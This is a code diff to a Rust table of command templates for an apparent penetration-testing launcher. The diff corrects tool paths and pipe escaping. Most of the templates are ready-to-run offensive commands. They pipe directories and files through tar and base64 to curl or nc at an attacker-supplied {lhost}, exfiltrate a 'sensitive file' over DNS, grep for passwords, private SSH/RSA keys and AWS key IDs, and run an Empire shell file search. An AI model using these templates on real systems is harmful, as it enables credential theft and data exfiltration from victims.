@@ -80,19 +80,19 @@ pub const TOOLS: &[Tool] = &[
     },
     Tool {
         name: "impacket-smbserver",
-        binary: "smbserver.py",
+        binary: "python3 /opt/tsec/tools/smbserver.py",
         description: "Quick SMB share for file transfer without external infrastructure.",
         modes: &[
             Mode {
                 name: "Basic Share",
-                cmd_template: r#"smbserver.py -smb2support {share_name} {share_path} > {output_file}"#,
+                cmd_template: r#"python3 /opt/tsec/tools/smbserver.py -smb2support {share_name} {share_path} > {output_file}"#,
                 inputs: &[InputKind::Custom("Share Name", "share_name"), InputKind::Custom("Share Path", "share_path")],
                 output_format: OutputFormat::Lines,
                 file_ext: "log",
             },
             Mode {
                 name: "Auth Share",
-                cmd_template: r#"smbserver.py -smb2support -username {user} -password {password} {name} {path} > {output_file}"#,
+                cmd_template: r#"python3 /opt/tsec/tools/smbserver.py -smb2support -username {user} -password {password} {name} {path} > {output_file}"#,
                 inputs: &[InputKind::Username, InputKind::Password, InputKind::Custom("Name", "name"), InputKind::Custom("Path", "path")],
                 output_format: OutputFormat::Lines,
                 file_ext: "log",
@@ -106,35 +106,35 @@ pub const TOOLS: &[Tool] = &[
             },
             Mode {
                 name: "Upload Share",
-                cmd_template: r#"smbserver.py -smb2support -comment 'Upload' upload {path} > {output_file}"#,
+                cmd_template: r#"python3 /opt/tsec/tools/smbserver.py -smb2support -comment 'Upload' upload {path} > {output_file}"#,
                 inputs: &[InputKind::Custom("Path", "path")],
                 output_format: OutputFormat::Lines,
                 file_ext: "log",
             },
             Mode {
                 name: "Specific IP",
-                cmd_template: r#"smbserver.py -smb2support -ip {ip} {name} {path} > {output_file}"#,
+                cmd_template: r#"python3 /opt/tsec/tools/smbserver.py -smb2support -ip {ip} {name} {path} > {output_file}"#,
                 inputs: &[InputKind::Ip, InputKind::Custom("Name", "name"), InputKind::Custom("Path", "path")],
                 output_format: OutputFormat::Lines,
                 file_ext: "log",
             },
             Mode {
                 name: "Custom Port",
-                cmd_template: r#"smbserver.py -smb2support -port 4455 {name} {path} > {output_file}"#,
+                cmd_template: r#"python3 /opt/tsec/tools/smbserver.py -smb2support -port 4455 {name} {path} > {output_file}"#,
                 inputs: &[InputKind::Custom("Name", "name"), InputKind::Custom("Path", "path")],
                 output_format: OutputFormat::Lines,
                 file_ext: "log",
             },
             Mode {
                 name: "Debug Mode",
-                cmd_template: r#"smbserver.py -smb2support -debug {name} {path} > {output_file}"#,
+                cmd_template: r#"python3 /opt/tsec/tools/smbserver.py -smb2support -debug {name} {path} > {output_file}"#,
                 inputs: &[InputKind::Custom("Name", "name"), InputKind::Custom("Path", "path")],
                 output_format: OutputFormat::Lines,
                 file_ext: "log",
             },
             Mode {
                 name: "No Auth",
-                cmd_template: r#"smbserver.py -smb2support -no-auth {name} {path} > {output_file}"#,
+                cmd_template: r#"python3 /opt/tsec/tools/smbserver.py -smb2support -no-auth {name} {path} > {output_file}"#,
                 inputs: &[InputKind::Custom("Name", "name"), InputKind::Custom("Path", "path")],
                 output_format: OutputFormat::Lines,
                 file_ext: "log",
@@ -148,7 +148,7 @@ pub const TOOLS: &[Tool] = &[
             },
             Mode {
                 name: "Full Transfer",
-                cmd_template: r#"smbserver.py -smb2support -username admin -password admin -ip {ip} data /tmp/data > {output_file}"#,
+                cmd_template: r#"python3 /opt/tsec/tools/smbserver.py -smb2support -username admin -password admin -ip {ip} data /tmp/data > {output_file}"#,
                 inputs: &[InputKind::Ip],
                 output_format: OutputFormat::Lines,
                 file_ext: "log",
@@ -204,14 +204,14 @@ pub const TOOLS: &[Tool] = &[
             },
             Mode {
                 name: "Banner Grab",
-                cmd_template: r#"echo '' \| nc -v -w 1 {target} {port} > {output_file}"#,
+                cmd_template: r#"echo '' | nc -v -w 1 {target} {port} > {output_file}"#,
                 inputs: &[InputKind::Target, InputKind::Ports],
                 output_format: OutputFormat::Lines,
                 file_ext: "txt",
             },
             Mode {
                 name: "HTTP Request",
-                cmd_template: r#"printf 'GET / HTTP/1.0\r\n\r\n' \| nc {target} 80 > {output_file}"#,
+                cmd_template: r#"printf 'GET / HTTP/1.0\r\n\r\n' | nc {target} 80 > {output_file}"#,
                 inputs: &[InputKind::Target],
                 output_format: OutputFormat::Lines,
                 file_ext: "txt",
@@ -225,7 +225,7 @@ pub const TOOLS: &[Tool] = &[
             },
             Mode {
                 name: "Directory Stream",
-                cmd_template: r#"tar czf - {directory} \| nc {lhost} {port} > {output_file}"#,
+                cmd_template: r#"tar czf - {directory} | nc {lhost} {port} > {output_file}"#,
                 inputs: &[InputKind::Custom("Directory", "directory"), InputKind::Lhost, InputKind::Ports],
                 output_format: OutputFormat::Lines,
                 file_ext: "txt",
@@ -372,7 +372,7 @@ pub const TOOLS: &[Tool] = &[
             },
             Mode {
                 name: "File Search",
-                cmd_template: r#"empire > shell dir C:\\Users\\ /s \| findstr '.pdf' > {output_file}"#,
+                cmd_template: r#"empire > shell dir C:\\Users\\ /s | findstr '.pdf' > {output_file}"#,
                 inputs: &[],
                 output_format: OutputFormat::Lines,
                 file_ext: "txt",
@@ -393,14 +393,14 @@ pub const TOOLS: &[Tool] = &[
         modes: &[
             Mode {
                 name: "Credential Search",
-                cmd_template: r#"grep -ri 'password\|passwd\|pwd' {directory} 2>/dev/null > {output_file}"#,
+                cmd_template: r#"grep -ri 'password|passwd|pwd' {directory} 2>/dev/null > {output_file}"#,
                 inputs: &[InputKind::Custom("Directory", "directory")],
                 output_format: OutputFormat::Lines,
                 file_ext: "txt",
             },
             Mode {
                 name: "Config Parse",
-                cmd_template: r#"grep -E '^(user\|pass\|host\|port\|key)' {config_file} > {output_file}"#,
+                cmd_template: r#"grep -E '^(user|pass|host|port|key)' {config_file} > {output_file}"#,
                 inputs: &[InputKind::File],
                 output_format: OutputFormat::Lines,
                 file_ext: "txt",
@@ -449,7 +449,7 @@ pub const TOOLS: &[Tool] = &[
             },
             Mode {
                 name: "Sensitive Pattern",
-                cmd_template: r#"grep -r -l -i 'BEGIN OPENSSH PRIVATE KEY\|BEGIN RSA PRIVATE KEY\|AKIA' {path} > {output_file}"#,
+                cmd_template: r#"grep -r -l -i 'BEGIN OPENSSH PRIVATE KEY|BEGIN RSA PRIVATE KEY|AKIA' {path} > {output_file}"#,
                 inputs: &[InputKind::Custom("Path", "path")],
                 output_format: OutputFormat::Lines,
                 file_ext: "txt",
@@ -491,7 +491,7 @@ pub const TOOLS: &[Tool] = &[
             },
             Mode {
                 name: "Base64 Transfer",
-                cmd_template: r#"cat {file} \| base64 \| curl -X POST -d @- http://{lhost}:{port}/ > {output_file}"#,
+                cmd_template: r#"cat {file} | base64 | curl -X POST -d @- http://{lhost}:{port}/ > {output_file}"#,
                 inputs: &[InputKind::File, InputKind::Lhost, InputKind::Ports],
                 output_format: OutputFormat::Lines,
                 file_ext: "txt",
@@ -533,7 +533,7 @@ pub const TOOLS: &[Tool] = &[
             },
             Mode {
                 name: "Full Pipeline",
-                cmd_template: r#"tar czf - {directory} \| base64 \| curl -X POST -d @- http://{lhost}:{port}/exfil > {output_file}"#,
+                cmd_template: r#"tar czf - {directory} | base64 | curl -X POST -d @- http://{lhost}:{port}/exfil > {output_file}"#,
                 inputs: &[InputKind::Custom("Directory", "directory"), InputKind::Lhost, InputKind::Ports],
                 output_format: OutputFormat::Lines,
                 file_ext: "txt",
@@ -547,14 +547,14 @@ pub const TOOLS: &[Tool] = &[
         modes: &[
             Mode {
                 name: "File DNS Exfil",
-                cmd_template: r#"python3 dns-exfiltrator.py -f {file} -d {domain} -n {nameserver} > {output_file}"#,
+                cmd_template: r#"python3 /opt/tsec/tools/dns-exfiltrator.py -f {file} -d {domain} -n {nameserver} > {output_file}"#,
                 inputs: &[InputKind::File, InputKind::Domain, InputKind::Custom("Nameserver", "nameserver")],
                 output_format: OutputFormat::Lines,
                 file_ext: "txt",
             },
             Mode {
                 name: "String Exfil",
-                cmd_template: r#"python3 dns-exfiltrator.py -s '{data}' -d {domain} -n {nameserver} > {output_file}"#,
+                cmd_template: r#"python3 /opt/tsec/tools/dns-exfiltrator.py -s '{data}' -d {domain} -n {nameserver} > {output_file}"#,
                 inputs: &[InputKind::Custom("Data", "data"), InputKind::Domain, InputKind::Custom("Nameserver", "nameserver")],
                 output_format: OutputFormat::Lines,
                 file_ext: "txt",
@@ -575,14 +575,14 @@ pub const TOOLS: &[Tool] = &[
             },
             Mode {
                 name: "Chunked Transfer",
-                cmd_template: r#"python3 dns-exfiltrator.py -f {file} -d {domain} -c 50 > {output_file}"#,
+                cmd_template: r#"python3 /opt/tsec/tools/dns-exfiltrator.py -f {file} -d {domain} -c 50 > {output_file}"#,
                 inputs: &[InputKind::File, InputKind::Domain],
                 output_format: OutputFormat::Lines,
                 file_ext: "txt",
             },
             Mode {
                 name: "Base32 Encoding",
-                cmd_template: r#"python3 dns-exfiltrator.py -f {file} -d {domain} -b > {output_file}"#,
+                cmd_template: r#"python3 /opt/tsec/tools/dns-exfiltrator.py -f {file} -d {domain} -b > {output_file}"#,
                 inputs: &[InputKind::File, InputKind::Domain],
                 output_format: OutputFormat::Lines,
                 file_ext: "txt",
@@ -596,7 +596,7 @@ pub const TOOLS: &[Tool] = &[
             },
             Mode {
                 name: "Throughput Test",
-                cmd_template: r#"python3 dns-exfiltrator.py -f /dev/zero -s 10M -d {domain} > {output_file}"#,
+                cmd_template: r#"python3 /opt/tsec/tools/dns-exfiltrator.py -f /dev/zero -s 10M -d {domain} > {output_file}"#,
                 inputs: &[InputKind::Domain],
                 output_format: OutputFormat::Lines,
                 file_ext: "txt",
@@ -610,7 +610,7 @@ pub const TOOLS: &[Tool] = &[
             },
             Mode {
                 name: "Full Exfil Chain",
-                cmd_template: r#"cat {sensitive_file} \| gzip \| base64 \| python3 dns-exfiltrator.py -s - -d {domain} -n {ns} > {output_file}"#,
+                cmd_template: r#"cat {sensitive_file} | gzip | base64 | python3 /opt/tsec/tools/dns-exfiltrator.py -s - -d {domain} -n {ns} > {output_file}"#,
                 inputs: &[InputKind::Custom("Sensitive File", "sensitive_file"), InputKind::Domain, InputKind::Custom("Ns", "ns")],
                 output_format: OutputFormat::Lines,
                 file_ext: "txt",
@@ -680,7 +680,7 @@ pub const TOOLS: &[Tool] = &[
             },
             Mode {
                 name: "Find All DBs",
-                cmd_template: r#"find /home -name '*.sqlite' -o -name '*.db' 2>/dev/null \| xargs -I {} sqlite3 {} '.tables' > {output_file}"#,
+                cmd_template: r#"find /home -name '*.sqlite' -o -name '*.db' 2>/dev/null | xargs -I {} sqlite3 {} '.tables' > {output_file}"#,
                 inputs: &[],
                 output_format: OutputFormat::Lines,
                 file_ext: "txt",
@@ -715,7 +715,7 @@ pub const TOOLS: &[Tool] = &[
             },
             Mode {
                 name: "Selective Archive",
-                cmd_template: r#"find {directory} -name '*.doc' -o -name '*.pdf' \| tar czf {output_file} -T -"#,
+                cmd_template: r#"find {directory} -name '*.doc' -o -name '*.pdf' | tar czf {output_file} -T -"#,
                 inputs: &[InputKind::Custom("Directory", "directory")],
                 output_format: OutputFormat::Raw,
                 file_ext: "out",
